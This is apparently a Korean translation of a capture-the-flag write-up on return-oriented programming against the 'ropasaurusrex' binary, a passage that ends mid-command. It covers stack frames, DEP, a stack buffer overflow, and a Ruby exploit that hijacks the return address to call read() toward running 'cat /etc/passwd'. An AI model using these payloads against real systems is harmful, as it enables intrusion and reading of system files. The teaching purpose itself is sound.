<p>그래서, 요약하자면: 함수가 호출되면 인자들이 스택에 들어가고, 그 뒤에 반환 주소가 들어간다. 함수가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 스택에 들어갔던 인자들은 <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">호출하는 함수에 의해 지워지지만</a>, <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall">예외</a>도 있다. 우리는 호출하는 함수가 인자를 지운다고 가정하자. 즉, 호출된 함수가 자신의 인자를 지우지 않는다고 가정하자. 이건 이 문제가 (그리고 Linux 대부분의 역사에서) 그렇게 동작하기 때문이다.</p>

<h2><a id="heaven-hell-and-stack-frames"></a>천국, 지옥 그리고 스택 프레임</h2>

<p>ROP를 이해하기 위해 이해해야 하는 가장 중요한 건: 함수의 스택 프레임은 그 함수의 온 우주라는 것이다. 스택은 함수의 신이고, 인자는 성경의 십계명이고, 지역 변수는 죄며, 프레임 포인터는 성경이고 반환 주소는 천국이다 (그래, 지옥일 수도 있다). 모든 건 <a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">인텔의 책</a>, 3장, 19-26구절에 있다 (주: 사실 아니니 보는 수고는 하지 마라).</p>

<p>당신이 <code>sleep()</code> 함수를 호출하고, 첫 라인에 왔다고 하자; 그 스택 프레임은 이렇게 생겼을 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</span><span class='line'>+----------------------+
</span><span class='line'>|      [seconds]       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- esp는 여기를 가리킨다.
</span><span class='line'>+----------------------+
</span><span class='line'>          ...            &lt;-- 할당되지 않았다, 영역은 상관 없다. (낮은 주소)</span></code></pre></td></tr></table></div></figure>


<p><code>sleep()</code>이 시작하는 순간, 스택 프레임은 지금 보이는 게 다다. 이 스택 프레임은 프레임 포인터를 저장할 수도 있고 (젠장, 말 안 하기로 해 놓고 두 번이나 말해버렸다; 다시는 언급하지 않을 것을 맹세한다) <code>esp</code>에서 몇 바이트 뺌으로써 (즉, <code>esp</code> 포인터를 더 낮은 주소로 만듦으로써) 지역 변수를 위한 공간을 확보할 수도 있다. <code>esp</code> 아래에 새 프레임을 만드는 다른 함수를 호출할 수도 있다. 이 스택 프레임은 여러 가지 다양한 일을 할 수 있다; 그게 무엇인지 간에, <code>sleep()</code>이 시작하면, 스택 프레임은 이 함수의 세계를 만들어낸다.</p>

<p><code>sleep()</code>이 반환하면, 결국 이렇게 생겼을 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</span><span class='line'>+----------------------+
</span><span class='line'>|      [seconds]       | &lt;-- esp는 여기를 가리킨다.
</span><span class='line'>+----------------------+
</span><span class='line'>| [old return address] | &lt;-- 할당되지 않았다, 영역은 상관 없다. 이제 여기부터 시작한다.
</span><span class='line'>+----------------------+
</span><span class='line'>          ...            (낮은 주소)</span></code></pre></td></tr></table></div></figure>


<p>당연히 호출한 함수는 <code>sleep()</code>이 반환하고 나면 <code>esp</code>에 4를 더해 &ldquo;seconds&#8221;를 스택에서 지운다 (나중에 똑같은 일을 하기 위해 어떻게 <code>pop/pop/ret</code>을 사용해야 하는지 이야기할 것이다).</p>

<p>제대로 동작하는 시스템에서는, 이게 작동 원리다. 안전한 전제다. &ldquo;seconds&rdquo; 값은 스택에 들어갔을 때 스택에만 있을 것이고, 반환 주소는 호출된 장소를 가리키고 있을 것이다. 그럼, 그럼. 달리 어떤 방법으로 그리 갈 수 있을까?</p>

<h2><a id="controlling-the-stack"></a>스택 주무르기</h2>

<p>&hellip;뭐, 당신이 궁금해 하니 말하겠다. 우리 모두 &ldquo;스택 오버플로&#8221;에 대해 들어봤다. 그건 스택에 있는 변수를 덮어쓰는 것과 관련이 있다. 그게 무슨 뜻이냐? 뭐, 이런 스택 프레임이 있다고 하자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</span><span class='line'>+----------------------+
</span><span class='line'>|      [seconds]       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- esp는 여기를 가리킨다.
</span><span class='line'>+----------------------+
</span><span class='line'>|     char buf[16]     |
</span><span class='line'>|                      |
</span><span class='line'>|                      |
</span><span class='line'>|                      |
</span><span class='line'>+----------------------+
</span><span class='line'>          ...            (낮은 주소)</span></code></pre></td></tr></table></div></figure>


<p>변수 <code>buf</code>의 길이는 16바이트다. 만약 프로그램이 buf의 17번째 바이트(즉, <code>buf[16]</code>)에 쓰려고 하면 어떻게 될까? 에, 반환 주소의 마지막 바이트&mdash;<a href="https://en.wikipedia.org/wiki/Endianness">리틀 엔디언</a>&mdash;에 쓰게 된다. 18번째 바이트는 반환 주소의 끝에서 두 번째 바이트에 쓰게 되고, 그런 방식이다. 이렇게 우리는 우리가 원하는 곳으로 반환 주소를 바꿀 수 있다. <em>원하는 곳 어디든</em>. 함수가 반환하면, 어디로 가겠는가? 뭐, 아마 그건 가야 할 곳으로 가고 있다고 생각할 것이다&mdash;완벽한 세계에서는, 그럴 것이다&mdash;하지만 아니다! 이 경우에는, 공격자가 원하는 곳 어디로든지 갈 수 있다. 공격자가 <a href="https://en.wikipedia.org/wiki/Zero_page">0</a>으로 점프하라고 하면, 0으로 점프하고 크래시를 일으킬 것이다. 공격자가 <code>0x41414141</code>(&ldquo;AAAA&rdquo;)로 점프하라고 하면, 그리로 점프하고 아마도 크래시를 일으킬 것이다. 공격자가 스택으로 점프하라고 하면&hellip; 음, 이건 좀 복잡해진다&hellip;</p>

<h2><a id="dep"></a>DEP</h2>

<p>전통적으로, 공격자는 스택에 코드를 넣을 수 있었기 때문에 (어찌 되었건, 코드는 그저 바이트 뭉치일 뿐이다!), 반환 주소가 스택을 가리키도록 바꿔 왔다. 하지만 그건 시스템을 공격하는 일반적이고 쉬운 방법이었기 때문에, OS 회사의 나쁜 자식들이 (농담이다, 난 당신들을 사랑한다 :)) 데이터 실행 방지, DEP를 통해 이를 멈췄다. DEP가 적용된 어떤 시스템이건, 스택에서 코드를 실행할 수 없다&mdash;좀 더 일반적으로, 공격자가 쓸(write) 수 있는 어떤 곳에서도&mdash;그렇지 않으면, 크래시를 일으킨다.</p>

<p>그러면 코드를 실행할 권한도 없이 도대체 어떻게 코드를 실행할 수 있나!?</p>

<p>음, 이제 그걸 할 것이다. 하지만 먼저, 이 문제가 사용하는 취약점을 보자!</p>

<h2><a id="the-vulnerability"></a>취약점</h2>

<p>여기 IDA에서 갓 뽑은 취약한 함수다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:080483F4vulnerable_function proc near
</span><span class='line'>.text:080483F4
</span><span class='line'>.text:080483F4buf             = byte ptr -88h
</span><span class='line'>.text:080483F4
</span><span class='line'>.text:080483F4         push    ebp
</span><span class='line'>.text:080483F5         mov     ebp, esp
</span><span class='line'>.text:080483F7         sub     esp, 98h
</span><span class='line'>.text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes
</span><span class='line'>.text:08048405         lea     eax, [ebp+buf]
</span><span class='line'>.text:0804840B         mov     [esp+4], eax    ; buf
</span><span class='line'>.text:0804840F         mov     dword ptr [esp], 0 ; fd
</span><span class='line'>.text:08048416         call    _read
</span><span class='line'>.text:0804841B         leave
</span><span class='line'>.text:0804841C         retn
</span><span class='line'>.text:0804841Cvulnerable_function endp</span></code></pre></td></tr></table></div></figure>


<p>어셈블리를 모른다면, 좀 벅차보일 것이다. 하지만 사실 간단하다. 같은 함수의 C 코드다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">ssize_t</span> <span class="kr">__cdecl</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>256바이트를 읽어 136바이트 버퍼에 넣는다. 즐거웠어요 스택 씨!</p>

<p>이걸 실행함으로써 쉽게 확인할 수 있다. &lsquo;A&rsquo; 뭉치를 파이프로 넣고, 어떻게 되는지 보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x300&quot;</span> <span class="p">|</span> ./ropasaurusrex
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>간단히 말해서, 이건 우리가 반환 주소를 글자 A 4개(<code>0x41414141</code>=&ldquo;AAAA&rdquo;)로 덮어썼다는 말이다.</p>

<p>이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 &ldquo;BBBB&#8221;를 넣고 <code>0x42424242</code>(&#8220;BBBB&rdquo;)에서 크래시를 일으킬 때까지 &lsquo;A&#8217;를 지웠다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x140;print &#39;BBBB&#39;&quot;</span> <span class="p">|</span> ./ropasaurusrex
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>이걸 좀 더 &ldquo;잘&rdquo; (내 뜻은, 더 천천히) 하고 싶으면, Metasploit의 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb">pattern_create.rb</a>와 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb">pattern_offset.rb</a>를 보라. 이건 추측이 느린 작업일 때 굉장히 좋지만, 이 문제의 경우에는 추측과 확인이 빨라 나는 쓰지 않았다.</p>

<h2><a id="starting-to-write-an-exploit"></a>익스플로잇 제작 시작하기</h2>

<p>가장 먼저 해야 할 일은 <code>ropasaurusrex</code>를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 <a href="https://en.wikipedia.org/wiki/Xinetd">xinetd</a>를 썼지만, 우리는 (우리의 목적에) 그만큼 좋은 <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>을 쓸 것이다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="k">while</span> <span class="nb">true</span><span class="p">;</span> <span class="k">do</span> nc -vv -l -p <span class="m">4444</span> -e ./ropasaurusrex<span class="p">;</span> <span class="k">done</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></code></pre></td></tr></table></div></figure>


<p>이제부터 우리는 <code>localhost:4444</code>를 익스플로잇 대상으로 쓸 수도 있고 실제 서버에도 작용하는지 테스트 할 수도 있다.</p>

<p>ASLR을 끄고 싶다면:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>0
</span></code></pre></td></tr></table></div></figure>


<p>이건 당신의 시스템을 익스플로잇 당하기 쉽게 만든다는 것을 알아둬라. 그러니 이걸 실험실 환경 바깥에서 하는 건 추천하지 않는다!</p>

<p>초반 익스플로잇을 위한 루비 코드다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">.</span><span class="n">/sploit</span><span class="o">.</span><span class="n">rb</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Generate the payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
</span><span class='line'>  <span class="o">[</span>
</span><span class='line'>    <span class="mh">0x42424242</span><span class="p">,</span>
</span><span class='line'>  <span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>ruby ./sploit.rb</code>를 통해 실행시키면 서비스 크래시를 볼 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 53451
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>gdb --quiet ./ropasaurusrex core
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>이게 익스플로잇의 시작이다!</p>

<h2><a id="how-to-waste-time-with-aslr"></a>어떻게 ASLR로 시간을 낭비하는가</h2>

<p>이 섹션을 &lsquo;시간 낭비&#8217;라고 하는 이유는, 내가 ASLR이 적용되어 있다는 것을&mdash;그 때&mdash;깨닫지 못했기 때문이다. 하지만 ASLR이 적용되어 있지 않다고 가정하는 것은 이 문제를 훨씬 교육하기 좋은 퍼즐로 만들어준다. 그러니 지금은 ASLR에 대해 걱정하지 말자&mdash;실제로, ASLR을 <em>정의</em>조차 하지 말자. 다음 섹션에 나올 것이다.</p>

<p>좋다, 이제 우린 뭘 하고 싶은가? 우린 취약한 프로세스를 가지고 있고, <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> 공유 라이브러리도 있다. 다음 단계는 뭔가?</p>

<p>음, 궁극적인 목표는 시스템 명령어를 실행하는 것이다. <a href="https://en.wikipedia.org/wiki/Standard_streams">stdin과 stdout</a>이 모두 <a href="https://en.wikipedia.org/wiki/Network_socket">소켓</a>에 연결되어 있으므로, 예를 들어 우리가 <code>system("cat /etc/passwd")</code>를 실행할 수 있다면, 끝난 거다! 이걸 할 수 있으면, 우린 어떤 명령어든 실행할 수 있다. 하지만 그건 두 가지 조건을 포함한다:</p>

<ol>
<li><code>cat /etc/passwd</code> 문자열을 메모리 어딘가에 넣기</li>
<li><code>system()</code> 함수 실행하기</li>
</ol>


<h3><a id="getting-the-string-into-memory"></a>메모리에 문자열 넣기</h3>

<p>메모리에 문자열을 넣는 건 실제로 두 소단계를 포함한다:</p>

<ol>
<li>우리가 쓸 수 있는 메모리를 찾기</li>
<li>그 메모리에 쓸 수 있는 함수 찾기</li>
</ol>


<p>무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 <a href="https://en.wikipedia.org/wiki/Data_segment">.data</a> 섹션이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>objdump -x ropasaurusrex  <span class="p">|</span> grep -A1 <span class="s1">&#39;\.data&#39;</span>
</span><span class='line'> <span class="m">23</span> .data         <span class="m">00000008</span>  <span class="m">08049620</span>  <span class="m">08049620</span>  <span class="m">00000620</span>  2**2
</span><span class='line'>                   CONTENTS, ALLOC, LOAD, DATA
</span></code></pre></td></tr></table></div></figure>


<p>오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. <code>objdump -x</code>의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'> <span class="m">20</span> .dynamic      000000d0  <span class="m">08049530</span>  <span class="m">08049530</span>  <span class="m">00000530</span>  2**2
</span><span class='line'>                   CONTENTS, ALLOC, LOAD, DATA
</span></code></pre></td></tr></table></div></figure>


<p>.dynamic 섹션은 동적 링크 정보를 담고 있다. 우리가 하려는 것에 그건 필요 없으니 주소 <code>0x08049530</code>을 덮어쓰기로 하자.</p>

<p>다음 단계는 주소 <code>0x08049530</code>에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리에게 무엇이 있는지 살펴보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>objdump -R ropasaurusrex
</span><span class='line'>
</span><span class='line'>ropasaurusrex:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'><span class="m">08049600</span> R_386_GLOB_DAT    __gmon_start__
</span><span class='line'><span class="m">08049610</span> R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'><span class="m">08049614</span> R_386_JUMP_SLOT   write
</span><span class='line'><span class="m">08049618</span> R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
</span></code></pre></td></tr></table></div></figure>


<p>즉시 사용 가능한 <code>read()</code>와 <code>write()</code>를 찾았다. 이건 유용하다! <code>read()</code> 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이럴 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>당신이 <code>read()</code> 함수에 진입했을 때, 이런 스택을 원할 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 스택 프레임 시작
</span><span class='line'>|     size_t count     | - count, strlen("cat /etc/passwd")
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - 쓸 수 있는(writable) memory, 0x08049530
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 'stdin' (0)이어야 한다.
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | - 'read'가 반환할 곳
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          | - 상관 없다, read()가 지역 변수를 위해 사용할 것이다.
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="n">sploit</span><span class="o">.</span><span class="n">rb</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -x</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Generate the payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
</span><span class='line'>  <span class="o">[</span>
</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span> <span class="c1"># number of bytes</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>        <span class="c1"># writable memory</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>          <span class="c1"># stdin</span>
</span><span class='line'>    <span class="mh">0x43434343</span><span class="p">,</span> <span class="c1"># read&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Clean up</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>공격 대상에 실행해 보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
